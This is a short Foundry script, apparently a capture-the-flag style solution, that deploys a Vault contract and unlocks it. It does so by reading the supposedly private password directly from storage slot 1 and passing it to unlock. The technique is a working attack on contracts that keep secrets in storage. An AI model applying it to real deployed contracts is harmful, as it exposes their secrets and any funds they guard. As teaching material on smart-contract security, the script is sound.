// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Vault.sol";

contract VaultHack is Script {
    Vault public vault;

    function run() public {
        // assume that we do not see the constructor
        vault = new Vault("A very strong secret password");

        // this step is equivalent to `web3.eth.getStorageAt()`
        bytes32 passwd = vm.load(address(vault), bytes32(uint256(1)));
        // to check password obtained is correct
        console.log(string(abi.encodePacked(passwd)));
        vault.unlock(passwd);
    }
}
